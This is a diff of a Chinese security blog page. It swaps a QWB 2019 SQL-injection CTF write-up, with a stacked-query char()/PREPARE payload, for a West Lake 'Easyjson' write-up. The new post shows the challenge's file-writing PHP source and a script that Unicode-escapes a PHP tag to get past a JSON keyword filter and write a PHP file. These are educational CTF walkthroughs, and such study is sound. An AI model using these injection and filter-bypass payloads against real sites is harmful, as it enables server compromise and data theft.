@@ -20,23 +20,30 @@
     var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。 解题思路题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。 return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject); 明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者">
-<meta name="keywords" content="WriteUp">
+  <meta name="description" content="前言 太菜了只做了一道  Easyjson 代码审计   &amp;lt;?php include &amp;#39;security.php&amp;#39;;  if(!isset($_GET[&amp;#39;source&amp;#39;])){     show_source(__FILE__);     die(); } $sandbox = &amp;#39;sandbox/&amp;#39;.sha1($_SERVER[&amp;#39;HTT">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="强网杯2019-随便注-复盘总结">
-<meta property="og:url" content="https://www.plasf.cn/articles/d72174f7cb.html">
+<meta property="og:title" content="西湖论剑Easyjson Write up">
+<meta property="og:url" content="https://www.plasf.cn/articles/2a808de4a49b19.html">
 <meta property="og:site_name" content="Xiao Leung&#39;s Blog">
-<meta property="og:description" content="前言当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。 解题思路题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。 return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject); 明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者">
+<meta property="og:description" content="前言 太菜了只做了一道  Easyjson 代码审计   &amp;lt;?php include &amp;#39;security.php&amp;#39;;  if(!isset($_GET[&amp;#39;source&amp;#39;])){     show_source(__FILE__);     die(); } $sandbox = &amp;#39;sandbox/&amp;#39;.sha1($_SERVER[&amp;#39;HTT">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/mycute20190905/15676946962230.png">
-<meta property="og:updated_time" content="2020-10-14T09:22:40.538Z">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png">
+<meta property="og:updated_time" content="2020-10-09T10:57:51.607Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="强网杯2019-随便注-复盘总结">
-<meta name="twitter:description" content="前言当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。 解题思路题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。 return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject); 明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者">
-<meta name="twitter:image" content="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png">
+<meta name="twitter:title" content="西湖论剑Easyjson Write up">
+<meta name="twitter:description" content="前言 太菜了只做了一道  Easyjson 代码审计   &amp;lt;?php include &amp;#39;security.php&amp;#39;;  if(!isset($_GET[&amp;#39;source&amp;#39;])){     show_source(__FILE__);     die(); } $sandbox = &amp;#39;sandbox/&amp;#39;.sha1($_SERVER[&amp;#39;HTT">
+<meta name="twitter:image" content="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png">
 
-<link rel="canonical" href="https://www.plasf.cn/articles/d72174f7cb.html">
+<link rel="canonical" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
 
 
 <script id="page-configurations">
@@ -49,7 +56,7 @@
   };
 </script>
 
-  <title>强网杯2019-随便注-复盘总结 | Xiao Leung's Blog</title>
+  <title>西湖论剑Easyjson Write up | Xiao Leung's Blog</title>
   
 
 
@@ -203,7 +210,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72174f7cb.html">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/header.jpg">
@@ -216,7 +223,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          强网杯2019-随便注-复盘总结
+          西湖论剑Easyjson Write up
         </h1>
 
         <div class="post-meta">
@@ -225,24 +232,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-09-04 23:18:49" itemprop="dateCreated datePublished" datetime="2019-09-04T23:18:49+08:00">2019-09-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:22:40" itemprop="dateModified" datetime="2020-10-14T17:22:40+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
+              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
             </span>
 
           
@@ -258,14 +250,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
+              <span>3.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -277,53 +269,142 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。</p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。</p>
-<pre><code class="php">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
-<p>明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者说无法使用联合查询之类的。尝试可以知道可以使用堆叠注入。</p>
-<pre><code class="mysql">1&#39;;show tables;#</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png" alt="img"></p>
-<p>但是由于过滤了select可以使用<code>concat()</code>将字符合成字符串而字符使用<code>char()</code>将ASCII转换为字符，即可bypass过滤，然后使用预处理执行目标语句。</p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="mysql">payload=&quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
-exp = &quot;select group_concat(flag) from supersqli.1919810931114514&quot;
-result=&#39;&#39;
-for i in exp:
-    result+=&quot;char(%s),&quot;%(ord(i))
-
-print(payload%(result[:-1]))#result[:-1]除去换行符</code></pre>
-<h2 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h2><pre><code class="mysql">0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(102),char(108),char(97),char(103),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(115),char(117),char(112),char(101),char(114),char(115),char(113),char(108),char(105),char(46),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52));PREPARE a FROM @s;EXECUTE a;</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute20190905/15676946962230.png" alt="img"></p>
-<h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><p><a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
-<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="mysql批处理"><a href="#mysql批处理" class="headerlink" title="mysql批处理"></a>mysql批处理</h2><pre><code class="csharp">设置变量：set @s=sql语句
-预处理语句：prepare 预处理名字 from ‘sql语句’
-执行预处理：execute 预处理名字 [using 变量]</code></pre>
-<p>例子：</p>
-<pre><code class="shell">mysql &gt;&gt; set @s=&quot;select group_concat(flag) from supersqli.1919810931114514&quot;
-mysql &gt;&gt; PREPARE a FROM @s
-mysql &gt;&gt; EXECUTE a</code></pre>
-<h2 id="知识拓展——PHP预处理"><a href="#知识拓展——PHP预处理" class="headerlink" title="知识拓展——PHP预处理"></a>知识拓展——PHP预处理</h2><pre><code class="php">//预处理语句，?为绑定的参数
-$mysql = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)&quot;);
-
-//绑定参数第一个参数为参数列处理其余参数的数据类型。如下$firstname, $lastname, $email三个变量都为字符串类型所以，第一个参数为sss
-
-$mysql-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);
-
-/*参数1有以下四种类型:
-i - integer（整型）
-d - double（双精度浮点型）
-s - string（字符串）
-b - BLOB（布尔值）*/
-
-//下面设置参数并执行
-$firstname = &quot;John&quot;;
-$lastname = &quot;Doe&quot;;
-$email = &quot;john@example.com&quot;;
-$stmt-&gt;execute();</code></pre>
-<h2 id="php批处理的优点："><a href="#php批处理的优点：" class="headerlink" title="php批处理的优点："></a>php批处理的优点：</h2><ul>
-<li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</li>
-<li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</li>
-<li>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</li>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>太菜了只做了一道</p>
+</blockquote>
+<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
+<li>代码审计</li>
 </ul>
+<pre><code class="php"> &lt;?php
+include &#39;security.php&#39;;
+
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
+    }
+}
+else{
+    die(&#39;Security Check Failed.&#39;);
+}
+</code></pre>
+<ul>
+<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
+</ul>
+<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
+<ul>
+<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
+<ul>
+<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
+<ul>
+<li>简单写个脚本来将字符串转化为unicode编码。</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+function unicode_encode($str){
+    $table = [
+            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
+            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
+            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
+            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
+            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
+            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
+];
+    foreach ($table as $key =&gt; $value) {
+        $i = 0;
+        foreach ($value as $vcode) {
+            $i=$i+1;
+            if($str==$vcode){
+                return $key.bin2e($i-1);
+            }
+
+        }
+    }
+
+}
+
+function bin2e($str){
+    switch ($str) {
+        case &#39;10&#39;:
+            return &#39;a&#39;;
+            break;
+        case &#39;11&#39;:
+            return &#39;b&#39;;
+            break;
+        case &#39;12&#39;:
+            return &#39;c&#39;;
+            break;
+        case &#39;13&#39;:
+            return &#39;d&#39;;
+            break;
+        case &#39;14&#39;:
+            return &#39;e&#39;;
+            break;
+        case &#39;15&#39;:
+            return &#39;f&#39;;
+            break;
+        default:
+            return $str;
+            break;
+    }
+}
+
+function main($str){
+for($i=0;$i&lt;strlen($str);$i++){
+    echo unicode_encode($str[$i]);
+}
+}
+
+
+main(&#39;&lt;?=phpinfo()?&gt;&#39;);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
+<ul>
+<li>EXP</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
+<ul>
+<li>Getflag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
 
     </div>
 
@@ -333,7 +414,7 @@ $stmt-&gt;execute();</code></pre>
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
           </div>
 
         
@@ -342,12 +423,12 @@ $stmt-&gt;execute();</code></pre>
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/articles/15614f899d.html" rel="prev" title="Suctf-Easy_SQL-复现总结">
-      <i class="fa fa-chevron-left"></i> Suctf-Easy_SQL-复现总结
+    <a href="/articles/159ab5557e.html" rel="prev" title="CISCN 2020 FINAL 部分Write Up">
+      <i class="fa fa-chevron-left"></i> CISCN 2020 FINAL 部分Write Up
     </a></div>
       <div class="post-nav-item">
-    <a href="/articles/d37b850031.html" rel="next" title="BASE64编码原理学习笔记">
-      BASE64编码原理学习笔记 <i class="fa fa-chevron-right"></i>
+    <a href="/articles/d611bed02b.html" rel="next" title="西湖论剑Easyjson Write up">
+      西湖论剑Easyjson Write up <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -407,7 +488,7 @@ $stmt-&gt;execute();</code></pre>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题思路"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本"><span class="nav-number">3.</span> <span class="nav-text">脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pyload"><span class="nav-number">3.1.</span> <span class="nav-text">pyload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#非预期解"><span class="nav-number">4.</span> <span class="nav-text">非预期解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关知识"><span class="nav-number">5.</span> <span class="nav-text">相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql批处理"><span class="nav-number">5.1.</span> <span class="nav-text">mysql批处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#知识拓展——PHP预处理"><span class="nav-number">5.2.</span> <span class="nav-text">知识拓展——PHP预处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php批处理的优点："><span class="nav-number">5.3.</span> <span class="nav-text">php批处理的优点：</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easyjson"><span class="nav-number">2.</span> <span class="nav-text">Easyjson</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
